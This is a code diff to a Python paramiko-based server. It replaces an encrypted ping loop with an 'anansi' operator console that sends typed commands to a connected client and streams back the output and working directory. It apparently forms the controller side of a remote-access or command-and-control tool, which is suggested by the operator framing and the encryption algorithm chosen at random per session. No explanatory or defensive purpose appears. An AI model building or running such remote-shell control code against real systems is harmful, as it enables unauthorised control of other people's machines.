@@ -8,7 +8,6 @@ import secrets
 import socket
 import struct
 import sys
-import time
 
 import paramiko
 from cryptography.hazmat.primitives import hashes
@@ -114,23 +113,43 @@ def load_host_key(path):
 
 
 def handle_session(channel):
-    """encrypted ping"""
-    channel.settimeout(10)
+    """operator console: commands in, responses out"""
+    channel.settimeout(60)  # must exceed the client's 30s command timeout
     key = handshake(channel)
     # send algorithm picked per session; frames carry their algo byte
     algo = random.choice(list(AEAD))
+    cwd = "?"
+    # request/response loop
     while True:
-        time.sleep(random.uniform(2.0, 5.0))
-        start = time.monotonic()
+        print(f"anansi {cwd}> ", end="", flush=True)
         try:
-            send_frame(channel, key, algo, b"ping")
-            reply = unseal_frame(key, recv_frame(channel))
+            line = input()
+        except EOFError:
+            # operator stdin closed
+            line = "exit"
+        command = line.strip()
+        if not command:
+            continue
+        try:
+            if command in ("exit", "quit"):
+                # let the client shut down, then drop the session here
+                send_frame(channel, key, algo, b"exit")
+                return
+            send_frame(channel, key, algo, command.encode())
+            # one reply = b"o" output frames, ended by one b"d" frame with cwd
+            while True:
+                payload = unseal_frame(key, recv_frame(channel))
+                if payload[:1] == b"d":
+                    cwd = payload[1:].decode(errors="replace")
+                    break
+                # command output need not be valid UTF-8
+                sys.stdout.buffer.write(payload[1:])
+                sys.stdout.buffer.flush()
         except (OSError, EOFError):
-            reply = b""
-        if reply != b"pong":
+            # channel died mid-session; InvalidTag is not caught on purpose,
+            # if tampered then kill the session
             print("session closed by client", flush=True)
-            break
-        print(f"pong {1000 * (time.monotonic() - start):.1f} ms", flush=True)
+            return
 
 
 def serve(bind, port, host_key, password):
